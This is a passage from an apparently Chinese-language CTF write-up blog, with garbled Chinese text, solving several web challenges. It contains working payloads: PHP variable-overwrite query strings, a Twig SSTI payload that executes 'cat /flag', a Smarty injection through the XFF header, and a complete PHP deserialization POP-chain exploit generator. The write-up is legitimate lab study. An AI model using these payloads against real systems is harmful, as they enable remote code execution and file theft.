</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="nv">$is</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;the flag is: &#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ªË¶ÅÂà©Áî®ÁÇπÂú®ËøôÈáå</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êàë‰ª¨Ë¶ÅÊ±ÇÊúÄÂêéËæìÂá∫flagÔºåË¶ÅÁªïËøá‰∏â‰∏™ifÂæàÂõ∞ÈöæÔºå‰ΩÜÊòØÂ¶ÇÊûúÊääexitÈáåÈù¢ÁöÑÂèòÈáèË¶ÜÁõñ‰πüËÉΩËæìÂá∫flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?yds=flag
</span></span><span class="line"><span class="cl">ËøôÈáåget‰º†ÂèÇ
</span></span><span class="line"><span class="cl">$x=yds;$y=flag
</span></span><span class="line"><span class="cl">$$x=$yds;$$y=$flag
</span></span><span class="line"><span class="cl">Êª°Ë∂≥Á¨¨‰∫å‰∏™Êù°‰ª∂
</span></span><span class="line"><span class="cl">ËøôÊ†∑exitÂ∞±‰ºöËøîÂõû$flagÁöÑÂÄº
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?is=flag&amp;flag=flag
</span></span><span class="line"><span class="cl">Êª°Ë∂≥Á¨¨‰∏â‰∏™Êù°‰ª∂
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?handsome=flag&amp;flag=x&amp;x=flag
</span></span><span class="line"><span class="cl">ËøôÈáåÂõ†‰∏∫get‰º†ÂèÇÔºå$x=$flag,flag=x,Êª°Ë∂≥Á¨¨‰∏Ä‰∏™Êù°‰ª∂
</span></span><span class="line"><span class="cl">ÊàñËÄÖÁõ¥Êé•?handsome=flag&amp;flag=handsome
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="wustctf2020Êú¥ÂÆûÊó†Âçé">[WUSTCTF2020]Êú¥ÂÆûÊó†Âçé
</h2><p>ËøôÈáåintvalÈáåÈù¢ÁöÑÊï∞Ë¶ÅÂ∞è‰∫é2020‰ΩÜÊòØ+1‰πãÂêéË¶ÅÂ§ß‰∫é2021</p>
<p>Áî®Âà∞ÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÔºåÂàöÂºÄÂßã2e5‰ºöË¢´Ëß£ÊûêÊàê2Ôºå‰ΩÜÊòØÂä†‰∏Ä‰πãÂêé‰ºöË¢´Ëß£Êûê‰∏∫20001ÔºåÁ¨¶ÂêàÊù°‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">   <span class="nv">$md5</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nv">$md5</span><span class="o">==</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$md5</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë¶ÅÊ±ÇË∑üÂéüÂ≠óÁ¨¶‰∏≤Áõ∏ÂêåÁöÑMD5</p>
<p>Âè™Êúâ0e215962017</p>
<h2 id="bjdctf2020cookie-is-so-stable">[BJDCTF2020]Cookie is so stable
</h2><p>cookieÊúâÈóÆÈ¢òÔºåÁªìÂêàËøô‰∏™ÊØîËµõ‰πãÂâçÁöÑÈ¢òÁõÆÊÄÄÁñëssti</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250213200047821.png"
	width="1840"
	height="524"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250213200047821_hu10634538342613399417.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250213200047821_hu11685162802597241356.png 1024w"
	loading="lazy"
	
		alt="image-20250213200047821"
	
	
		class="gallery-image" 
		data-flex-grow="351"
		data-flex-basis="842px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{7*&#39;7&#39;}}ÂõûÊòæ49ËØ¥ÊòéÊòØtwigÊ®°ÊùøÊ≥®ÂÖ•
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áõ¥Êé•‰∏äpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}{{_self.env.getFilter(&#34;cat /flag&#34;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-Âçé‰∏úÂçóËµõÂå∫web11">[CISCN2019 Âçé‰∏úÂçóËµõÂå∫]Web11
</h2><p>smartyÊ≥®ÂÖ•</p>
<p>Áõ¥Êé•xffÂ§¥‰∏ä{system(&lsquo;cat /flag&rsquo;)}</p>
<h2 id="mrctf2020ezpop">[MRCTF2020]Ezpop
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span>  <span class="nv">$var</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Welcome to &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÖàÊâæÂÖ•Âè£<code>__construct</code>ÔºåÂèëÁé∞<code>__get()</code>ÂáΩÊï∞‰ºöËøîÂõû‰∏Ä‰∏™ÂáΩÊï∞ÂèØ‰ª•Ëß¶Âèë<code>__invoke</code>ÊñπÊ≥ïÔºåÊâÄ‰ª•ËÆ©<code>p=new Modifier()</code>,ËøôÈáå‰ºöË∞ÉÁî®appendÊù•ËØªÂèñvarÁöÑÂÄºÔºåÊàë‰ª¨varËÆæÁΩÆ‰∏∫‰º™ÂçèËÆÆËØªflag,ËøòÂâ©‰∏§‰∏™ÊñπÊ≥ïÊ≤°Ë¢´Ëß¶Âèë</p>
<p><code>__tostring</code>ÂèØ‰ª•Áî±show‰∏ãÈù¢ÁöÑ<code>__wakeup()</code>ÈáåÈù¢ÁöÑÊ≠£ÂàôÂåπÈÖç‰ºöÊääsourceÂèòÂ≠óÁ¨¶‰∏≤ÔºåÊâÄ‰ª•ÂèØ‰ª•ËÆ©<code>source=new Show()</code>,Ëß¶Âèë‰πãÂêé‰ºöËøîÂõûstr-&gt;source,ËøôÈáåÂ¶ÇÊûúÂ∞Üstr‰º†Áªô<code>__get()</code>,Áî±‰∫é‰ºöËæìÂá∫‰∏çÂ≠òÂú®ÁöÑÂèòÈáèsourceÊàêÂäüËß¶Âèë</p>
<p>ÊâÄ‰ª•ÂÆåÊï¥ÁöÑpopÈìæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">new</span> <span class="n">showËß¶Âèë__construct</span><span class="p">,</span><span class="err">ÁÑ∂Âêé</span><span class="n">source</span><span class="o">=</span><span class="n">new</span> <span class="n">showËß¶Âèë__tostring</span><span class="p">,</span><span class="nb">str</span><span class="o">=</span><span class="n">new</span> <span class="n">testËß¶Âèë__get</span><span class="p">,</span><span class="n">p</span><span class="o">=</span><span class="n">new</span> <span class="n">Modifier</span><span class="p">()</span><span class="err">Ëß¶Âèë</span><span class="n">__invoke</span><span class="p">,</span><span class="err">ÊúÄÂêéË∞ÉÁî®</span><span class="n">appendËæìÂá∫flag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span>  <span class="nv">$var</span><span class="o">=</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Welcome to &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span> <span class="k">new</span> <span class="nx">Modifier</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">=</span><span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">=</span><span class="nv">$c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">p</span><span class="o">=</span><span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÂÆâÊ¥µÊùØ-2019easy_web">[ÂÆâÊ¥µÊùØ 2019]easy_web
</h2><p>ÂõæÁâáurlÁúãËµ∑Êù•ÊòØbase64</p>
<p>Ëß£Á†ÅÁúãÁúã</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215221837836.png"
	width="1650"
	height="845"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215221837836_hu18198552740549756126.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215221837836_hu2534495837598624071.png 1024w"
	loading="lazy"
	
		alt="image-20250215221837836"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="468px"
	
></p>
<p>‰∏§Ê¨°base64Âä†‰∏Ä‰∏™hexËΩ¨ascii</p>
<p>ÊûÑÈÄ†index.phpËØªÂèñ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222010287.png"
	width="1630"
	height="791"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222010287_hu5885471893544763700.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215222010287_hu8338634857043800619.png 1024w"
	loading="lazy"
	
		alt="image-20250215222010287"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="494px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222154542.png"
	width="1208"
	height="484"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222154542_hu17008549295610857005.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215222154542_hu3795412211393294775.png 1024w"
	loading="lazy"
	
		alt="image-20250215222154542"
	
	
		class="gallery-image" 
		data-flex-grow="249"
		data-flex-basis="599px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">||</span> <span class="o">~</span> <span class="nx">E_NOTICE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;content-type:text/html;charset=utf-8&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">])));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[^a-zA-Z0-9.]+/&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;xixiÔΩû no flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$txt</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;img src=&#39;data:image/gif;base64,&#34;</span> <span class="o">.</span> <span class="nv">$txt</span> <span class="o">.</span> <span class="s2">&#34;&#39;&gt;&lt;/img&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
